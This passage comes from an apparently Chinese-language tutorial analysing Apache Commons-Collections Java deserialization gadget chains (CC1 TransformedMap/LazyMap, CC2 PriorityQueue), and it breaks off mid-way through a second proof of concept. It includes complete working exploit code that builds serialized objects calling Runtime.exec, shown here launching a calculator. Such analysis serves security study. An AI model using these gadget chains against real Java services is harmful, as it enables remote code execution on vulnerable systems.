    [2] 这个 Map 用 TransformedMap 进行封装，并且调用自定义的 ChainedTransformer 进行装饰
    [3] ChainedTransformer 中写入多个 Transformer 实现类来进行链式调用从而达到恶意操作
**POC**
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.io.*;
    import java.lang.annotation.Retention;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.InvocationTargetException;
    import java.util.HashMap;
    import java.util.Map;
    public class CommonsCollectionsTransformedMap {
        public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, InvocationTargetException {
            Transformer[] transformer = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
            Map hashMap = new HashMap();
            hashMap.put("value", "d1no");
            Map transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
            Class h3rmesk1t = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor = h3rmesk1t.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, transformedMap);
            try {
                // 序列化
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
                objectOutputStream.writeObject(invocationHandler);
                objectOutputStream.close();
                // 反序列化
                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
                ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
                objectInputStream.readObject();
                objectInputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
###  Commons-Collections1-LazyMap 分析
核心点在`LazyMap#get`，`LazyMap`在没有`key`时会尝试调用`this.factory.transform`方法，而`this.factory`可以指定为`Transformer`对象，而且`transform`方法参数会被忽略掉，因此只需要寻找一个调用了`LazyMap.get`的方法。
这里`AnnotationInvocationHandler`类的`invoke()`方法可以触发`this.memberValues`来调用`get`方法，从而触发`LazyMap#get`。
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import java.io.*;
    import java.lang.annotation.Retention;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Proxy;
    import java.util.HashMap;
    import java.util.Map;
    public class CommonsCollectionsLazyMap {
        public static void main(String[] ars) throws ClassNotFoundException ,InstantiationException, IllegalAccessException, InvocationTargetException {
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            Map LazyMap = org.apache.commons.collections.map.LazyMap.decorate(new HashMap(), chainedTransformer);
            Class h3rmesk1t = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor = h3rmesk1t.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, LazyMap);
            Map mapProxy = (Map) Proxy.newProxyInstance(org.apache.commons.collections.map.LazyMap.class.getClassLoader(), org.apache.commons.collections.map.LazyMap.class.getInterfaces(), invocationHandler);
            InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, mapProxy);
            try {
                // 序列化
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
                objectOutputStream.writeObject(handler);
                objectOutputStream.close();
                // 反序列化
                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
                ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
                objectInputStream.readObject();
                objectInputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
###  调用链
    AnnotationInvocationHandler.readObject()
       *Map(Proxy).entrySet()
            *AnnotationInvocationHandler.invoke()
                LazyMap.get()/TransformedMap.setValue()
                    ChainedTransformer.transform()
                        ConstantTransformer.transform()
                            InvokerTransformer.transform()
###  总结
利用`AnnotationInvocationHandler`在反序列化时会触发`Map`的`get/set`等操作，配合`TransformedMap/LazyMap`在执行`Map`对象的操作时会根据不同情况调用`Transformer`的转换方法，最后结合了`ChainedTransformer`的链式调用、`InvokerTransformer`的反射执行完成了恶意调用链的构成，其中`LazyMap`的触发还用到了动态代理机制。
## CommonsCollections2链
###  环境搭建
  1. `JDK`版本：JDK1.8u66
  2. `Commons-Collections4`版本：4.0
  3. `javassit`版本：`3.25.0-GA`
利用`maven`来进行搭建，先创建一个`Maven`项目，不用选择任何`Maven`模板，`pom.xml`中内容如下，之后选择右侧的更新，让其自动导入包即可。
        4.0.0
        org.example
        commons-collections
        1.0-SNAPSHOT
                org.apache.commons
                commons-collections4
                4.0
                org.javassist
                javassist
                3.25.0-GA
###  前置知识
**PriorityQueue**
`PriorityQueue`优先级队列是基于优先级堆的一种特殊队列，它给每个元素定义“优先级”，这样取出数据的时候会按照优先级来取，默认情况下，优先级队列会根据自然顺序对元素进行排序；因此放入`PriorityQueue`的元素必须实现`Comparable`接口，`PriorityQueue`会根据元素的排序顺序决定出队的优先级，如果没有实现`Comparable`接口，`PriorityQueue`还允许提供一个`Comparator`对象来判断两个元素的顺序，`PriorityQueue`支持反序列化，在重写的`readObject`方法中将数据反序列化到`queue`中之后，会调用`heapify()`方法来对数据进行排序。
在`heapify()`方法中又会调用`siftDown()`方法，在`comparator !=
null`下会调用`siftDownUsingComparator()`方法，在`siftDownUsingComparator()`方法中会调用`comparator`的`compare()`方法来进行优先级的比较和排序。
**TransformingComparator**
`TransformingComparator`类似`TransformedMap`，用`Tranformer`来装饰一个`Comparator`，待比较的值将先使用`Tranformer`转换，再传递给`Comparator`比较，`TransformingComparator`初始化时配置`Transformer`和`Comparator`，如果不指定`Comparator`则使用`ComparableComparator.comparableComparator()`。  
在调用`TransformingComparator`的`compare`方法时，调用了`this.transformer.transform()`方法对要比较的两个值进行转换，然后再调用`compare`方法比较。
在`PriorrityQueue`中最后会通过`comparator`的`compare()`方法来进行优先级的比较和排序，这里可以通过调用`TransformingComparator`中的`transform()`方法来和之前连接起来。
**Javassist**
`Java`字节码以二进制的形式存储在`.class`文件中，每一个`.class`文件包含一个`Java`类或接口，`Javaassist`就是一个用来处理`Java`字节码的类库，它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解，同时也可以去生成一个新的类对象，通过完全手动的方式。
**TemplatesImpl**
`TemplatesImpl`的属性`_bytecodes`存储了类字节码，`TemplatesImpl`类的部分方法可以使用这个类字节码去实例化这个类，这个类的父类需是`AbstractTranslet`，在这个类的无参构造方法或静态代码块中写入恶意代码，再借`TemplatesImpl`之手实例化这个类触发恶意代码。
###  Commons-Collections2 分析
先跟进`PriorityQueue#readObject`，其`queue`的值来自于`readObject()`方法，是可控的，循环完成后会调用`heapify()`方法。
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in size, and any hidden stuff
        s.defaultReadObject();
        // Read in (and discard) array length
        s.readInt();
        queue = new Object[size];
        // Read in all elements.
        for (int i = 0; i >> 1) - 1; i >= 0; i--)
            siftDown(i, (E) queue[i]);
    }
    private void siftDown(int k, E x) {
        if (comparator != null)
            siftDownUsingComparator(k, x);
        else
            siftDownComparable(k, x);
    }
    private void siftDownUsingComparator(int k, E x) {
        int half = size >>> 1;
        while (k  0)
                c = queue[child = right];
            if (comparator.compare(x, (E) c) <= 0)
                break;
            queue[k] = c;
            k = child;
        }
        queue[k] = x;
    }
这里将`comparator`和`TransformingComparator`结合起来，如果这里`this.transformer`是可控的话，就可以进一步利用`CC-1`链的后半段部分。
    public int compare(I obj1, I obj2) {
        O value1 = this.transformer.transform(obj1);
        O value2 = this.transformer.transform(obj2);
        return this.decorated.compare(value1, value2);
    }
这里需要注意几个地方，在`heapify()`方法处的`size`要是大于`1`的，只有这样才会继续进入到`siftDown()`方法中。
**POC-1**
利用`PriorityQueue`和`CommonsCollections-1`后半部分来进行构造。
    package CommonsCollections2;
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    /**
     * @Author: H3rmesk1t
     * @Data: 2021/11/26 9:42 下午
     */
    public class CommonsCollectionsGadget1 {
        // public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        public static void CC2() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
            PriorityQueue priorityQueue = new PriorityQueue(2);
            priorityQueue.add(1);
            priorityQueue.add(2);
            Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
            field.setAccessible(true);
            field.set(priorityQueue, transformingComparator);
            try {
                // 序列化操作
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./CC2EvilGadget.bin"));
                outputStream.writeObject(priorityQueue);
                outputStream.close();
                // 反序列化操作
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./CC2EvilGadget.bin"));
                inputStream.readObject();
                inputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public static void main(String[] args) {
            try {
                CC2();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
**POC-2**
为了更好的符合实战利用中的要求，利用`InvokerTransformer`触发`TemplatesImpl`的`newTransformer`，从而读取恶意字节码从而进行执行命令，并且利用`javassist`和`TemplatesImpl`来进行构造。
    package CommonsCollections2;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import javassist.ClassClassPath;
    import javassist.ClassPool;
    import javassist.CtClass;
    import javassist.*;
    import java.io.*;
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;